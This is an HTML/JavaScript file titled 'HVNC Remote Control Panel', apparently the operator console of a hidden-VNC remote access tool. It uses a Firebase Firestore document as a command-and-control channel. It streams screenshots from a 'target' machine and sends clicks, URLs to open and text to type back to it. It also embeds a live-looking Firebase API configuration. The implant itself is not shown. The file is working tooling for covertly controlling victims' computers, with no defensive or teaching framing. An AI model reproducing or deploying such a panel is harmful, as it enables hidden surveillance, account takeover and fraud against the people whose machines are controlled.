
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HVNC Remote Control Panel</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #header { background: #111; padding: 10px; display: flex; gap: 10px; border-bottom: 1px solid #333; }
        #screen-container { position: relative; display: inline-block; width: 100%; text-align: center; margin-top: 10px; }
        #remote-screen { border: 2px solid #333; cursor: crosshair; max-width: 95vw; height: auto; }
        input, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; border-radius: 4px; }
        button:hover { background: #0f0; color: #000; cursor: pointer; }
        .status { font-size: 12px; margin-left: 20px; color: #888; }
    </style>
</head>
<body>

<div id="header">
    <input type="text" id="urlInput" placeholder="Enter URL or Search...">
    <button onclick="sendCommand('navigate')">Navigate</button>
    <button onclick="sendCommand('type')">Type & Enter</button>
    <span class="status" id="status">Connecting to Firebase...</span>
</div>

<div id="screen-container">
    <img id="remote-screen" onclick="handleInteraction(event)" src="" alt="Waiting for target screen...">
</div>

<script>
    // Aapka Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
        authDomain: "smsyy-f7bb7.firebaseapp.com",
        projectId: "smsyy-f7bb7",
        storageBucket: "smsyy-f7bb7.firebasestorage.app",
        messagingSenderId: "199149027655",
        appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const docRef = db.collection('artifacts').doc('smsyy-f7bb7').collection('public').doc('session_data');

    const screenImg = document.getElementById('remote-screen');
    const statusText = document.getElementById('status');

    // 1. Listen for Live Screen Updates
    docRef.onSnapshot((doc) => {
        if (doc.exists) {
            const data = doc.data();
            if (data.screenshot) {
                screenImg.src = "data:image/jpeg;base64," + data.screenshot;
                statusText.innerText = "Target Online - Last Update: " + new Date().toLocaleTimeString();
            }
        }
    }, (error) => {
        statusText.innerText = "Error: " + error.message;
    });

    // 2. Handle Clicks on Screen
    function handleInteraction(e) {
        const rect = screenImg.getBoundingClientRect();
        // Scale to 1280x720 (Target resolution)
        const x = Math.round((e.clientX - rect.left) * (1280 / rect.width));
        const y = Math.round((e.clientY - rect.top) * (720 / rect.height));

        docRef.set({
            command: {
                action: 'click',
                x: x,
                y: y,
                timestamp: Date.now()
            }
        }, { merge: true });
    }

    // 3. Send Navigation/Type Commands
    function sendCommand(type) {
        const val = document.getElementById('urlInput').value;
        const payload = {
            action: type,
            timestamp: Date.now()
        };

        if (type === 'navigate') payload.url = val;
        if (type === 'type') payload.text = val;

        docRef.set({ command: payload }, { merge: true });
        document.getElementById('urlInput').value = '';
    }
</script>

</body>
</html>
